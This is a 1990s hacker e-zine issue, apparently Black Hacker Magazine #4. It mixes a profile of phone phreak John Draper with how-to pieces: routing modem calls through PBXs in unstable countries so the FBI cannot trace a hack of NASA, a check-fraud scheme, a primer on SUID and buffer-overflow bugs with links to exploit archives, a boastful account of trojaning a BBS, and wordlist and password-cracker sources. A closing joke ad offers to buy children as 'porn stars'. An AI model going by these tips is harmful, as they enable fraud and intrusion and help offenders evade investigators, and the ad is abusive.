+   Draper owns up to a slight correction of his myth - the blind kids, he
+says, told him about the Cap'n Crunch whistle. He used it only after their
+recommendation.
+   A strange underground fame, however, got attached to his name. Stories
+about Draper and his phreak friends calling the White House, reaching
+President Nixon personally, telling him about a crisis-level shortage of
+toilet paper, giggling and hanging up, circulated around the country back in
+the '70s. People started seeking out Draper's advice on phreaking and hacking.
+A college student named Steve Wozniak contacted him for a blue-box lesson.
+Draper obliged, and Wozniak contacted the Pope and called a payphone at
+London's Grand Central Station. Crunch tried to teach Wozniak never to sell
+the equiptment because he'd get in trouble, but Wozniak did anyway, using
+the cash to put himself through college and build his first computer.
+Wozniak went on to co-found Apply Computer. Today, both friends have reciprocal
+links on their Web pages.
+   In 1971, writer Ron Rosenbaum who had interviewed many phreaks in the
+growing worldwide network, called Draper for an Esquire magazine story.
+Draper was suspicious, but agreed to it anyways. Despite a few errors -
+Draper's Web page carefully lists each inaccuracy - Rosenbaum's piece was
+thorough, and shocked a technologically unsawy America with tales of snot-
+nosed kids outwitting Ma Bell. A few months later, the indictments
+and investigations began. Draper's peaceful phreak existance soon came crashing
+down around him. On day after finishing a computer class at his college, he
+stopped by a 7-11 before heading home. Four FBI agents jumped out and grabbed
+him in the parking lot. Draper was put on five yars probation for wire fraud.
+   Four yars later he was convicted of the same crima and spent four months
+in California's Lompoc Federal Prison. He taught phone-phreak classes to
+prisoners to avoid beeing labeled uncooperative or as a snitch. "It was almost
+like a Boy Scout camp," he says. "I worked in the pug farm. I got kicked out
+because I kept putting judges' names on the pigs. They didn't like that too
+much."
+   After his release from the prison, Draper began to drift. He wrote
+EasyWriter, a pioneering word-processing program, for an impressed Wozniak
+in the mid-'80s. He used his expertise to nail down few good jobs. In 1984,
+a former hacker hired Draper to work for his at a software company. Over the
+last three years he worked there, Draper says he began irritating his cigar-
+smoking supervisor (who he demaned not to smoke in the office). When the
+former hacker hired him left the company, so did Draper's protection. He
+was fired by the smoker. Since then, despite another year-long programming
+job that provided him with some savings and trusly PowerBook, he has had
+little professional success. For a while, Draper lived in a beautiful hunting
+lodge, but then the money ran out. He now sleeps at a campground.
+   Draper admits however, that he now feels freer than ever before. 
+
+                                 *  *
+
+   Four hours later and the King of Phreakers is still freaking out in the
+middle of Kinko's. He hadn't counted on his crisis. He has a busy day planned.
+He has to meet his friend Symonty, an Australiancomputer programmer with
+fluorescent green hair, in downtown San Francisco later in the evening.
+Symonty was among the many, who after meeting with Draper at a rave a few
+nights back, was astouned by his bottomless energy.
+   And, of course, Draper says he has to spend at least a few hours in the
+lazy afternoon sun, bumming around Mill Valley's red bricked Town Square.
+   Draper finally switches his address to an unlisted account and gives
+up. He leaves the heavy deleting for the system administrator (his e-mail
+file has grown to 30 megabytes). His ranting finally slows to a hacking
+critique: "We might leave a note saying, 'kilroy was here,' but that's about
+it. But we never would have done anything like this mail spamming thing.
+(Hackers) are more damaging today than they were before. They have no remorse."
+   At the Square, Draper immediately spots Don Fricault, a Larkspur software
+designer who likes to watch the babes emerge from Mill Valley's fancy
+restaurants and upscale coffee shops. Draper walks right up to him and asks
+his friend if he knows how to solve his e-mail problems. Fricault makes a
+couple of suggestions, but Draper methodically shoots them down. Fricault
+finally gives up, and Draper walks away to speak with other friends.
+   Fricault met Draper a few years ago, and they briefly worked together
+designing Web pages for the Marin Cyber Group. Fricault had always known who
+Draper was - in college, he says, "We had him up as a hero. Those were
+rebellious times and everything."
+   Today, Fricault says, Draper is "more like a character. His technical
+expertise is probally leveled off somewhat. He's got a commanding nature,
+and sometimes you have to back him off. But he's harmless, totally harmless.
+As soon as he heard about the Web, he put up his Web site. He likes to be
+the star."   Fricault surveys the Square, pointing out the bare-chested
+playing chess, and then returns to his thoughts abour Draper. "There's too
+many characters here," he says. "It's like a TV show."
+   Draper returns. "Guess what?" he asks Fricault. "Power is out in all the
+Western states."
+   "It's probably the same guys who were spamming you," Fircault suggests.
+But Draper doesn't hear it. His pager has gone off and he's wandering back
+to spend more time with his most loyal friends - the phones.
+
+
+.-==[The hackers worst nightmare (?)]========================================-.
+|===[By: Codeblaster]=[BHM#4]=[04k]=[#10]=====================================|
+`-===========================================================================-'
+
+As many of us hackers, I started my hacking career as a BBS hacker and for
+years I've been hacking bbs' until I recently (finally) moved on the inet.
+There is one thing I don't understand about you inet hackers; The fear of
+beeing traced after a hack - and the fear of having left "clues" on the
+system that could expose your real identity. Don't get me wrong, it's not
+like I don't give a shit if the feds knock on my door tomorrow - it's not
+that. But it seems like people moving onto the internet are forgetting some
+of the good ol' methods they used before to prevent getting caught. Sure,
+you can clean your tracks on victim.gov, you can IPSpoof, you can do lotsa
+stuff to prevent the "victims" from finding you - but let's forget all that
+and look backwards... back to the "root" - stuff that software and scripts
+can't do, stuff that you do yourself.
+
+If you're going to hack nasa.gov or something similar, then it's nice to
+have some phreakin skills to - beeing a unix wizard isn't always enough.
+If I were to hack something as big as that, I would've done this;
+----
+1. Gotten myself a fake internet account. - Read BHM#2 if you don't know
+   how to do this. Either make one yourself or get one from a friend or
+   something, whatever - as long as it isn't yours (and can't be traced
+   back to you (like your fathers account or something like that))
+
+2. I would've gotten myself one, or even a couple of PBX's.
+
+3. I would've called Telecom and requested that my number should not
+   be available for ISDN/CALLER ID's. This way, my number is not sent
+   over the line. I don't know if you can do this in the US, but here
+   in Norway you can do it.
+----
+
+Now, after only doing these 3 things I've made it *ALOT* harder for the
+feds to catch me. Almost impossible. Before the hack I would've made my
+modem call internet like this:
+
+MODEM -> PBX1 -> PBX2 -> ISP
+
+The PBX1 would be located in my own area so that I wouldn't have to pay
+that much to fuck nasa over. Preferable the second PBX should be located
+in Eastern Europe (or some poor country antoher place in the world).
+
+Then I would've gone hax0rd nasa! :)
+
+What happens then?
+------------------
+Since I feel pretty safe I don't care if they trace my IP and shit, so the
+feds easily managed to trace that. Then they probably would have called
+my ISP to get my realname, address and phonenumber. My ISP would give them
+my fake info from the fake account. The feds would then find out that the
+info was fake (either at once, or some days of investigation later if you
+enter an existing dude's info ;)).
+
+Then the feds would probably get telecom to see who logged in on the ISP
+at that the time nasa was hacked. Then they find out wich of them had the
+fake IP. Now they would get a number, like +XX-EASTERN-EUROPE. Then they
+would probably realise that this one was going to get though.
+
+They manage to contact telecom in that poor country, but since there is
+a war going on in the country, they have better things to do then trace
+calls for the FBI. Better yet; you could choose a PBX in an country like
+IRAK or something, so when the FEDS call them they would probably hear
+something like "FUCK OFF AMERICANS!" ;)       -> In short; If you're
+calling through a PBX in a country that has problems, they have better
+things to do than trace phone lines - so the feds will be stuck there.
+
+Even if the feds in some miracleous way manages to get the number that
+called the PBX in IRAK they would only get the PBX in your country. And
+then it's probably gone 14 days since you did the hack and all data about
+who called that PBX that day is deleted. (In Norway such info is deleted
+after 14 days - it's the law here (the Data Protection Registar) don't know
+if you have rules for that in US or the country you live in).
+
+Conclusion
+----------
+As you see, it would be *VERY* hard for the feds to get through this kind
+of security net. And if you're a unix wizard to you can always take those
+kind of precautions to :)
+
+                                                  Codeblaster/ns!^food^grs
+
+.-==[Find bugs in Unix Systems]==============================================-.
+|===[By: Ripperjack!]=[BHM#4]=[02k]=[#11]=====================================|
+`-===========================================================================-'
+
+MINI-ULTRA-HURRY-UP INTRODUCTION TO FIND BUGS IN UNIX SYSTEMS.
+
+1. INTRO
+2. LOOKING FOR SUID PROGRAMS
+3. BUGTESTING THE SUID PROGRAMS
+4. BUFFER OVERFLOWS
+5. EXPLOITS AND WWW
+
+1. INTRO
+The only way to find bugs in systems are to install them. I've just installed
+FreeBSD and have begun bugtesting it. I've found one bug in the latest version
+after about 10 hours of work.
+Bugtesting is a time consuming business, but if you know how to bugtest a
+system it can be kept down to a minimum. The first thing is to get to know the
+system; an manual would do fine. After you've done this you can go on to the
+next step.
+
+2. LOOKING FOR SUID PROGRAMS
+Suid programs are those with a +s on them. They have when run the perms of
+the owner. This means if we can shell from a suid program we will have the
+perms of the owner.
+
+3. BUGTESTING THE SUID PROGRAMS
+Bugtesting can as said be a time consuming business, but if the operator is
+stupid he may have all the defaults on. Maybe he hasn't removed stupid programs
+which can perform commands or he has installed some. Admins always think that
+their system never will be hacked. They use defaults and this makes them
+vunerable.
+
+4. BUFFER OVERFLOWS
+A buffer overflow is when a program exceeds a buffer. In Unix when programs
+overflow they may leave you with the priveliges of the owner. These bugs are
+quite common.
+
+5. EXPLOITS AND WWW
+If you're not willing to find bugs yourself, visit one of the below listed
+sites. They're all great sites for finding the latest and best exploits.
+
+www.rootshell.com
+www.enslaver.com/enslaver.html
+www.dhp.com/~fyoder/sploits_all.html
+http://www.tacd.com/exploit/
+www.r0ot.org
+www.outpost9.com/exploits/exploits.html
+www.exploits.com
+cybrids.simplenet.com/hacking/archive.html
+sunshine.nextra.ro/fun/new
+
+                                                    ;_ripperjack signing off~'
+                                          STING THE SUID PROGRAMS
+
+.-==[My first hack]==========================================================-.
+|===[By: Codeblaster]=[BHM#4]=[03k]=[#12]=====================================|
+`-===========================================================================-'
+
+
+Me and my hacker friend had planned this for several weeks now. We had tested
+it on my system, and the trojan worked perfect. We had uploaded it to our
+victim, and could barely wait to call back in excitement. We made some useless
+programs in pascal to get the time to fly, but one question kept popping into
+my head "Had the sysop runned the trojan now?".    "Call back now!" my friend
+said every now and then, I just said that we had to wait another half an hour.
+Then... finally, it was time, the clock was 04:00 pm and we expected the sysop
+to have gone to bed now.
+
+We said nothing as my modem connected to the board. My friend told me what
+to login as, even though he know I remembered it better than him. Ah, inside,
+couln't bare the excitement now. "Test it.. come on test it!". No, not yet. 
+Had to know that the sysop wasn't watching first. Paged him a couple of times,
+did some stupid errors, pretended not to find files and shit, and then - when
+I was pretty certain that he wasn't watching, I wrote the magic words on the
+command promt. I pressed ENTER, and there! the users started scrolling over
+my screen. I felt the adreanaline rushing through my vains, and heard a funny
+mixture of hardcore techno and my friends laughter in the background. Ah, this
+was it! I was a hacker, I really felt like one anyway. When all the users
+were listed, I just had to drop to dos and see if they were all listed in
+the capture, and they were.
+
+Haha, this was really cool I thought, petty those lamers that don't know
+anything else than playing games and such on their PC. My friend was even
+more excited than me, and tried to grab the keyboard. No way. I was in 
+charge here. "But I have to do something!". Yeah, I have to do something
+to, I said. "Drop to dos!". Good idea. I used the sysop commands and dropped
+to dos, the lamer had a funny prompt saying 'Enter Your Command Master#>' -
+it made the feeling even better. We fucked around in his dos for several
+hours, downloading the files we wanted and looked through his system.
+
+Then, it was logout time. We wanted to check the files we had leeched, and
+we wanted to release the hack and show it to all our hacker friends at our
+local hpa board. And so we did. A hour later or something, we called back
+to the hacked board and logged in as sysop, just to fool around even more
+in his dos. But when we got to the 'lastcallers' he broke into chat and
+asked what the hell we were doing. We logged of immedeatly from the shock ;)
+and besides, we didn't want to chat with him right then.
+
+It's like I've always said - don't listen to what the others tell you; the
+first time is great! ;)
+
+.-===========================================================================-.
+|                        _/_                 | Black Hacker Magazine Issue #4 |
+|          ._______     //    /]!            | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+| ___ __ __|_      \_.__\\ ________/______   |  [a] - [b] - [C] - [d] - [e]   |
+|(__/   \   /        _   \      _ /     _/_  |  094   258  1823  1945  2181   |
+| |____ /_ /       _ /__ / _____\\ ___  \__) | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+|         /________\_ n o  s h i t !  \/     | Misc Stuff: Just the articles  |
+|        /                                   | we couldn't place elsewhere.   |
+`-===[SECTION C: MISC STUFF!]================================================-'
+
+
+.-==[How to earn (alot of) money on Credit Check Fraud]======================-.
+|===[By: Codeblaster]=[BHM#4]=[01k]=[#13]=====================================|
+`-===========================================================================-'
+
+Ok, this works in the country I live in, and it probably does in yours to.
+(Haven't tried it out myself, but several sources tell me it works)
+
+You know when you pay with credit check you have to write the amount on
+the check both in numbers and alphabeticly. ie. if you're going to buy
+something that costs 100$ you fill out;
+$ 100      and     onehundred
+
+well, the thing is - that when your account is credited (when they take
+the money from your bank account) they have to look at the alphabetic and
+NOT the numbers. so if you fill out;
+$ 300      and     onehundred
+     
+(writing onehundred really ugly - yet readable), you will get 300$ and they
+will only take 100$ from your bank account. Pretty cool huh ;)
+
+
+.-==[One of the better ways to hide DOS files (?)]===========================-.
+|===[By: Codeblaster]=[BHM#4]=[03k]=[#14]=====================================|
+`-===========================================================================-'
+
+The Happy Hacker mailing list of July 2, 1997 discussed a way of hiding
+DOS files. The method they described, works nice enough - but this was
+far from something new, as almost everyone who has been using DOS for
+some years knew of this little 'trick' before. What most people don't
+know though, is that one can use <SPACE> (char 32) in filenames in DOS,
+and make it unreadable for ALL (?) DOS programs. For those of you who
+don't know about the first method to hide DOS files, I'm going to explain
+it here;
+
+You can hide files in a directory that can't be accessed by Windows by
+using high chars as char 255 in the beginning or end of the directory
+name. To create such a dir, simply type this from DOS;
+
+C:\> MD SECRET[ALT+255]
+
+The [ALT+255] means that you hold down your ALT key, and then press 255 on
+your numeric keyboard (still holding down the ALT key). To access the dir
+you must write
+
+C:\> CD SECRET[ALT+255]
+
+In DOS, the directory will look like this;
+---------
+ Volume in drive C has no label
+ Volume Serial Number is 3F33-16F7
+ Directory of C:\download\D\D
+
+.              <DIR>        03.08.97  17:07 .
+..             <DIR>        03.08.97  17:07 ..
+SECRETÿ        <DIR>        03.08.97  17:07 SECRETÿ
+         0 file(s)              0 bytes
+         3 dir(s)      82 427 904 bytes free
+
+---------
+
+But if you try to access it by typing "CD SECRET" it will just say "Invalid
+Directory" ... In windows the directory will look like this;
+
+"SECRET_"
+
+but if you try to access it, you'll soon find out that you can't. The dir
+simply can't be accessed from Windows 3.x or Win95.
+
+This way of hiding your files is secure if you're dealing with your
+mother etch ;), but it's not exactly safe. Everyone using NORTON COMMANDER
+can easily access the dir by just entering it the normal way in NC, so if
+you're dealing with your regular DOS user, the method above won't be safe
+enough.
+
+So, therefor, I'm going to show you a way to use <SPACE> (char 32) in your
+filenames, the files can be accessed by Windows then but NOT by DOS, so
+if you use both these tricks, your files can't be accessed from WINDOWS and
+neither from DOS :) ... I don't know how this works, but with this simple
+BASIC program I wrote, you can copy (rename) files to a filename with
+<space> in it.
+
+
+INPUT "File to copy:", FILENAME$
+INPUT "To Name (try name with space):", NEWNAME$
+OPEN FILENAME$ FOR INPUT AS #1
+OPEN NEWNAME$ FOR OUTPUT AS #2
+DO
+ LINE INPUT #1, a$
+ PRINT #2, a$
+LOOP UNTIL (EOF(1))
+
+If you just want to test the stuff, try running this program in QBASIC:
+
+OPEN "F CK" FOR OUTPUT AS #1
+PRINT #1, "F UCK"
+CLOSE #1
+
+... and you'll see that it works. That file, "F UCK" can't be accessed by
+any dos programs like NC, or whatever. It just can't be accessed from DOS.
+However, if you try looking at it in Windows, that will work fine. So put
+it in a directory with special chars in it, so it can't be accessed from
+Windows either. For you to access it, you must run a QBASIC program again,
+and rename the files to `working filenames' ...
+
+I don't know how this works - it's kinda weird cause it only works from
+QBASIC... If you try writing the same code in f.ex. Pascal, you will
+get `Illegal Filename' ... If someone knows more about this, let me know,
+seems like some DOS bug or something ...
+
+                                                Codeblaster/Food^ns!^grs
+
+.-===========================================================================-.
+|                        _/_                 | Black Hacker Magazine Issue #4 |
+|          ._______     //    /]!            | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+| ___ __ __|_      \_.__\\ ________/______   |  [a] - [b] - [c] - [D] - [e]   |
+|(__/   \   /        _   \      _ /     _/_  |  094   258  1823  1945  2181   |
+| |____ /_ /       _ /__ / _____\\ ___  \__) | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+|         /________\_ n o  s h i t !  \/     | Internet: Sup on the net? and  |
+|        /                                   | other stuph...                 |
+`-===[SECTION D: INTERNET]===================================================-'
+
+
+.-==[Hexediting your MIRC32.EXE to make it eliter! :)]=======================-.
+|===[By: Codeblaster]=[BHM#4]=[03k]=[#15]=====================================|
+`-===========================================================================-'
+
+
+  Ok, since all of us mIRC lamers don't want those elite BitchX'ers and unix
+  users to find out that we're actually running mIRC, I'm now going to
+  explain how to hexedit your MIRC32.EXE so that you'll be a bit more 313371.
+
+  *NOTE* To do this patch you need a hex editor. If you don't know what that
+         is please stop reading now, and move on to the next article. If you
+         do know what a hex editor is I recommend HEX WORKSHOP by Breakpoint
+         Software (www.bpsoft.com).
+
+  After patching MIRC32.EXE the way explained here; when other users on IRC
+  do a VERSION on you to see what you're running they will get NO REPLY AT
+  ALL. They won't get "Mirc 5.02 by..." or "*** lame 7thsphere" etc. they
+  will get no respons. This is pretty kewl... :) .. oki
+  The original MIRC32.EXE:
+
+  494F 4E00 0001 5645 5253 494F 4E01 0000  <-->  ION...VERSION...
+  4564 6974 696E 6720 6F75 7420 7468 6520  <-->  Editing out the
+  7665 7273 696F 6E20 7265 706C 792C 2068  <-->  version reply, h
+  7568 3F20 3A29 0000 4E4F 5449 4345 2025  <-->  uh? :)..NOTICE %
+  7320 3A01 5645 5253 494F 4E20 6D49 5243  <-->  s :.VERSION mIRC
+  3332 2025 7320 4B2E 4D61 7264 616D 2D42  <-->  32 %s K.Mardam-B
+  6579 010A 0000 7635 2E30 3200 005B 2573  <-->  ey....v5.02..[%s
+  2056 4552 5349 4F4E 5D00 0001 534F 554E  <-->   VERSION]...SOUN
+  4420 0000 0143 4C49 454E 5449 4E46 4F01  <-->  D ...CLIENTINFO.
+
+  Seems like that Khaled dude knew someone was gonna pull something like
+  this huh? ;) Well, just use HW (or whatever hex editor you're using) to
+  search for fex. "Editing out the" and you'll find the stuff above. Now,
+  the new file should look like this (* = this line is changed)
+
+  494F 4E00 0001 5645 5253 494F 4E01 0000  <-->  ION...VERSION...
+  4564 6974 696E 6720 6F75 7420 7468 6520  <-->  Editing out the
+  7665 7273 696F 6E20 7265 706C 792C 2068  <-->  version reply, h
+  7568 3F20 3A29 0000 4D53 4720 2020 2025  <-->  uh? :)..MSG    %   *
+  7320 3A01 5645 5253 494F 4E20 2573 202D  <-->  s :.VERSION %s -   *
+  2573 202D 2025 7320 2D20 2573 202D 2025  <-->  %s - %s - %s - %   *
+  7320 2D20 2573 202D 2025 7320 005B 2573  <-->  s - %s - %s .[%s   *
+  2056 4552 5349 4F4E 5D00 0001 534F 554E  <-->   VERSION]...SOUN
+  4420 0000 0143 4C49 454E 5449 4E46 4F01  <-->  D ...CLIENTINFO.
+  
+  Ok, this patch is probably kind of lame as I did it 4 in the morning or
+  something, but anyways, you can write anything up there. As long as you
+  overwrite the original (NOTICE) code. I've tried to replace NOTICE with
+  MSG to send the dude a message instead, but that didn't work either. I
+  also experimented by putting lotsa "%s"'s in the code to see if the dude
+  who replyed got his own nickname in return or something, but they got
+  no reply at all, and that's the best. 
+
+  Have phun, and remember, you can patch other parts of MIRC32.EXE too -
+  but don't patch too much cause then you'll probably fuck something up.
+
+  Codeblaster
+
+
+.-==[New way of earning money on The Internet]===============================-.
+|===[By: Codeblaster]=[BHM#4]=[01k]=[#16]=====================================|
+`-===========================================================================-'
+
+If you read different internet related  magazines you have probably heard
+of this new way of earning money (or at least get free stuff) by now. For
+those of you who haven't, let me explain the concept;  You register your-
+self as a user of the service and download a program, then you are frequently
+sent commercial wich you view in your program. You get X points for each
+commecrial you view at least 5 seconds. You later use your points to order
+pizza, take a trip to hawaii, whatever. I think the concept originally was
+invented here in Scandinavia, - Scandinavians can visit www.digilog.no. US
+readers can find a service like this on www.freeride.com. As IU so nicely
+put it; "If you're struggeling to pay for the pipeline, consider selling your
+soul to the ad man." :)
+
+
+.-==[Internet Resources (kewl URLs)]=========================================-.
+|===[By: Codeblaster]=[BHM#4]=[08k]=[#17]=====================================|
+`-===========================================================================-'
+
+Resources on the ...
+ ___       __________    _ ______   _ ________      ___________   _ ____
+ \ |__.----\   _|    l___      __`---,  __  _/_.----\   :|   __`---,    l___ __
+S|\l :|   \ \  \_    ___/__    l/   /_  /_    :|   \ \  .|   l/   /_    ___//_/
+L|   .|    \    |    l    :|   ____/ |   \    .|    \    |   ____/ |    l    :|
+Vl____l----->___|----._____l---._____l----\____l----->___|---._____l----._____l
+                        
+-°--------------------------------------------------------------------------°-
+
+  Ok, some articles in this magazine require that you have certain files or
+  programs. Here's a list of some sites you can get the stuff you need at:
+
+  * Wordlists:
+    ----------
+       ftp.cdrom.com /.20/security/coast/dict/wordlists
+                        - they have lotsa wordlists here, and in many
+                          languages. Norwegian, Swedish, German, French,
+                          Italien etc. etc. And ofcourse in English ;)
+       ftp.uni-koeln.de /dictionaries/
+       ftp.ox.ac.uk /pub/wordlists/ & /pub/comp/security/COAST/dict/wordlists
+                        - Lotsa wordlists in all languages
+
+    Here are some additional sites you can check out if you really need
+    lotsa wordlists: (I haven't check these myself)
+        ftp.denet.dk         /pub/wordlists
+        ftp.scn.rain.com     /pub/wordlists
+        ftp.uni-trier.de     /pub/wordlists
+        ftp.dsi.unimi.it     /DSI/basagni/Wordlist
+        ftp.super.unam.mx    /pub/security/tools/PGP/DSI/basagni/Wordlist
+        ftp.hol.gr           /.mirrors0/ftp.funet.fi_pub_unix/databases/biblio/PUB/KINMONTH/wordlist
+        ftp.iij.ad.jp        /academic/religious_studies/Bahai/cgi-bin/wordlist
+        ftp.iro.umontreal.ca /pub/contrib/pinard/maintenance/ptx/rmail/tools/wordlist
+        ftp.nj.nec.com       /pub/kevin/pilot/wordlist
+        ftp.funet.fi         /pub/unix/databases/biblio/PUB/KINMONTH/wordlist
+        ftp.ifmo.ru          /pub/unix/databases/biblio/PUB/KINMONTH/wordlist
+        ftp.aimnet.com       /pub/users/jdbecker/WordList4
+        ftp.doc.ic.ac.uk     /Mirrors/ftp.std.com/obi/WordLists
+        ftp.ua.pt            /disk3/misc/docs/obi/WordLists
+        unix.hensa.ac.uk     /mirrors/uunet/.vol/2/literary/obi/WordLists
+        ftp.std.com          /obi/WordLists
+        ftp.uni-trier.de     /pub/buecher/obi/WordLists
+        ftp.loria.fr         /pub7/obi/WordLists
+        ftp.imw.tu-clausthal.de /mirror/ftp.mindlink.net/pub/crypto/Wordlists
+        ftp.imw.tu-clausthal.de /mirror/ftp.wimsey.bc.ca/pub/crypto/Wordlists
+        ftp.mindlink.net     /pub/crypto/Wordlists
+        ftp.univ-evry.fr     /.00/security/wordlists
+        ftp.inf.tu-dresden.de /.2.1/vol2/doc/dictionaries/wordlists
+        ftp.hkstar.com       /.3/COAST/dict/wordlists
+        ftp.hkstar.com       /.3/COAST/mirrors/ftp.netsys.com/wordlists
+        ftp.waseda.ac.jp     /.u5/security/wordlists
+        ftp.doc.ic.ac.uk     /Mirrors/ftp.uni-stuttgart.de/pub/systems/acorn/riscos/database/wordlists
+        ftp.rediris.es       /mirror/crypt/wordlists
+        ftp.rediris.es       /mirror/crypt/crypto/wordlists
+        ftp.pacbell.com      /mirror/sable.ox.ac.uk/wordlists
+        ftp.pbi.net          /mirror/sable.ox.ac.uk/wordlists
+        ftp.denet.dk         /mirror1/wordlists
+        ftp.sterling.com     /mirrors2/coast.cs.purdue.edu/pub/dict/wordlists
+        ftp.sterling.com     /mirrors2/coast.cs.purdue.edu/pub/mirrors/ftp.netsys.com/wordlists
+        ftp.cenatls.cena.dgac.fr /pub/wordlists
+        ftp.cs.ruu.nl        /pub/TEX/wordlists
+        ftp.access.digex.net /pub/access/lojbab/wordlists
+        ftp.digex.net        /pub/access/lojbab/wordlists
+        ftp.chass.utoronto.ca /pub/cch/
+        ftp.auscert.org.au   /pub/coast/dict/wordlists
+        ftp.auscert.org.au   /pub/coast/mirrors/ftp.netsys.com/wordlists
+        ftp.auscert.org.au   /pub/coast/mirrors/ftp.ox.ac.uk/wordlists
+
+      
+  * John The Ripper:
+    ----------------
+       http://www.false.com/security/john/
+                        - Official John The Ripper Homepage
+       http://www3.sympatico.ca/the.chaser/PWCRACK.HTM
+                        - This site has lotsa password crackers, but do
+                          we really need anyone else than JTR?
+
+  * Other interesting sites:
+    ------------------------
+       http://www.netnation.com/nf_order.html
+                        - Order your own domain. And they take CC's ;)
+       http://www.spystuff.com
+                        - Lotsa cool equiptment. They send worldwide.
+                          (bugs, bug detection, bomb detection etc.etc.)
+       http://www.dhp.com/
+                        - The Data Haven Project. Offering secure and
+                          private homepages for H/P
+       http://www.feist.com/~tqdb/evis-idx.html
+                        - Great Index of H/P History. Newsclippings from
+                          1970 -> 1997!
+       http://www.r0ot.org
+                        - Nice url set up by Matrix, a friend of mine on
+                          ef-net. You can get all our mags here!
+                          Check it out!
+       http://www.infowar.com
+                        - If you haven't been there yet, go there
+       http://lod.com/ 
+                        - Legion Of Doom homepage
+       http://www.bigbook.com/
+                        - Quickly find any of 16 million US businesses
+                          (Kinda like the Yellow pages)
+       http://www.tollfree.att.net/dir800/
+                        - Search for AT&T 800 numbers (by company name etc.)
+       http://www.spectre-press.com/
+                        - Order hacking/phreaking catalogs (they take credit cards!;)
+       http://www.nando.net/newsroom/hacksources.html
+                        - Some info about Kevin Mitenick +++
+       http://www.rcn.org
+                        - RCN, a nice PC-Emag - has some H/P stuff, but mostly
+                          Warez oriented, so it should probably be considered
+                          as lame. But if you're into that kinda stuff, this
+                          is something for you.
+       http://www.counterpane.com/blowfish.html
+                        - Explains Blowfish (Encryption)
+
+  * Some extras (all HPA realated)
+    ------------------------------
+       http://www.abel.net.uk/~dms/mindmain.html
+                        - Good and updated UNIX hacking page
+       http://www.sonic.net/z/a-h.shtml
+                        - Lotsa HPA Files!
+       http://www.geocities.com/SiliconValley/2460/files.html
+                        - Lotsa Files! Virii/hpa/etcetc.
+       http://www.snip.net/users/jabukie/hacking.html
+                        - Lotsa Files UNIX hacking etc.
+       http://www.trailerpark.com/phase1/Heraclit/files.htm
+                        - Links, and they work! woooah!
+       http://www.jps.net/forest/wax/hacking.html
+                        - Nice site, some files
+       http://www.geocities.com/CapeCanaveral/3498/security.htm
+                        - Security and Hackerscene
+       http://sibervision.com/sh/
+                        - Simon's Hideout
+       http://laker.net/frozen/download.html
+                        - FileS! HPA!
+       http://dana.ucc.nau.edu/~jer5/hack.htm
+                        - Hacking textphiles etc.
+       http://cataract.nfss.edu.on.ca/blitz/wel.htm
+                        - Neat Site :)
+       http://hudson.idt.net/~atahsu19/misc.html
+                        - Misc
+       http://www.sophist.demon.co.uk/ping/
+                        - The ping'o'death page, how to use the WIN95's
+                          ping.exe to kill servers... (ph34r!)
+
+
+.-===========================================================================-.
+|                        _/_                 | Black Hacker Magazine Issue #4 |
+|          ._______     //    /]!            | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+| ___ __ __|_      \_.__\\ ________/______   |  [a] - [b] - [c] - [d] - [E]   |
+|(__/   \   /        _   \      _ /     _/_  |  094   258  1823  1945  2181   |
+| |____ /_ /       _ /__ / _____\\ ___  \__) | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ |
+|         /________\_ n o  s h i t !  \/     | Bye-Bye!: Closing stuph!       |
+|        /                                   |                                |
+`-===[SECTION E: BYE-BYE!]===================================================-'
+
+
+
+.-==[This Issues CONTEST! First time EVER in BHM!]===========================-.
+|===[By: Codeblaster]=[BHM#4]=[01k]=[#18]=====================================|
+`-===========================================================================-'
+
+-°-------------------------------------------------------------------------°-
+ °     This issues fantastic contest! wow! win almost 1,000,000$           °
+-°-------------------------------------------------------------------------°-
+
+   NS! proudly presents ... for the first time in BHM ... a... eeeei....
+
+                           * C O N T E S T * 
+
+   We'll try to make this a tradition, and have a contest in every issue
+   from now on.  It'll be fun  +  we will get some more response than we
+   normally do -  and have a chance to see how many reads this magazine!
+
+   Ok, this issues contest is pretty simple. The question is individual,
+   so there are no answers that are 'correct' - all answers are correct.
+   (ehh.. you got that?) Well, anyway, the question is ...
+
+   "Which article is the best ever published in Black Hacker Magazine?"
+
+   All articles from BHM#1 to BHM#4 may be voted for,   the results from
+   this contest will be released in BHM#5,   winner of the contest,  and
+   and which article that got voted as best article. The winner will just
+   be randomly picked from the ones who send us an email.
+
+   The price is a, very good, expensive, hackable, free...
+
+                       * S H E L L - A C C O U N T *
+  
+   So, start sending emails to blackhackers@hotmail.com to get that shell!
+
+-°-------------------------------------------------------------------------°-
+
+
+.-==[Add Section! Private, personal adds here!]==============================-.
+|===[By: Codeblaster]=[BHM#4]=[02k]=[#19]=====================================|
+`-===========================================================================-'
+
+Since "Confidence Remains High" decided to follow up on PLA's (Phone Loosers
+of America) awesome add-section, we in Ns! found out that it's about time
+we have something like that too ;)... Send yar adds to rjack_@hotmail.com
+
+...............................  ..............................................
+: Free NetsEx! We know you're :  : Body Parts Ltd. We sell/buy working livers :
+: horny as hell,so that's why :..:............................. hearts, arms, :
+: we at  #bible have decided : wELP! I'm a sexy blonde bimbo : legs,and most  :
+: to start NETSEXing!    Next : who really needs a man!  Dial : other parts of:
+: time you are on EF-NET type : 140  and tell me how much you : your body!    :
+: /Join #bible,the magic word : you want me.    The number is : Send mail to: :
+: is "Fuck God! Let's NetSex" : tax free of course!           : Body Parts Ltd:
+: Please report  any problems :...............................: c/o Haukeland :
+: to "haggai1"- I'm always ON : Want to sell your kids? : Sykehus, 5002 Bergen:
+:.............................: I'll pay upto 5000$ for : Norway. don't forget:
+  : FOOD LOVERS LOOK HERE!!!! : each boy, and 6000$ (!) : to tell us what body:
+  : A new channel  on  EF-NET : for girls!No older than : parts you want!     :
+  : called #food is for all u : 12 please!The kids will :.....................:
+  : food lovers!  we have all : be taken good  care of, : S&M'ers look here!  :
+  : the recipes! Pizza, pan-  : and become porn stars!! : 4 all you masochists:
+  : cakes, spaghetti,  gruff, : (804)-320033 for a deal : who love to be kickd:
+  : etc.etc. Now doesn't that :.........................: and spanked hard    :
+  : sound tempting?!    /Join :                         : join #hack and ask  :
+  : #food next time you're on :  YOUR ADD COULD BE HERE : questions like "How :
